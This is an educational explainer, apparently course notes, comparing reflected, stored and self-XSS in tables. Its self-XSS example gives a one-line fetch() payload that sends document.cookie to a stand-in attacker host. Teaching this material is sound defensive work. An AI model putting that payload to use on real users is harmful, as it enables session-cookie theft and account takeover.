# 08. Common questions about reflected cross-site scripting

## 📌 Differences Between Reflected, Stored, and Self-XSS

### 🔁 Reflected XSS vs. Stored XSS

| Aspect | **Reflected XSS** | **Stored XSS** |
| --- | --- | --- |
| **Source** | Input comes from the **immediate HTTP request** | Input comes from **previously stored data** |
| **Timing** | Reflected **immediately** in the HTTP response | Reflected **later** in another response |
| **Persistence** | **Non-persistent** – needs to be delivered via link or request | **Persistent** – lives on the server/database until triggered |
| **Delivery** | Delivered via crafted **URL, email, or input** | Delivered when the **stored data is loaded** |

📝 **Example:**

- **Reflected XSS:**
    
    Attacker sends a link like `https://example.com/search?q=<script>...</script>`
    
- **Stored XSS:**
    
    Attacker posts a comment containing `<script>...</script>` that runs when viewed by others.
    

---

### 👤 Reflected XSS vs. Self-XSS

| Aspect | **Reflected XSS** | **Self-XSS** |
| --- | --- | --- |
| **Trigger Method** | Triggered by a **crafted URL or input** from attacker | Triggered by **victim themselves**, typically by pasting code |
| **User Involvement** | Victim is **passive** – simply clicks a link or loads a page | Victim is **active** – manually pastes attacker’s script |
| **Delivery Method** | Sent via URL, input field, or cross-domain request | Requires **social engineering** |
| **Severity** | Considered a **real vulnerability** | Considered **low-impact or lame** due to limited exploitation |

🧠 **Self-XSS Example:**

An attacker convinces a user to paste the following into their browser’s developer console:

```
fetch('https://attacker.com/steal?cookie=' + document.cookie)

```

Since this requires **voluntary victim action**, it does **not reflect a true vulnerability in the application** itself.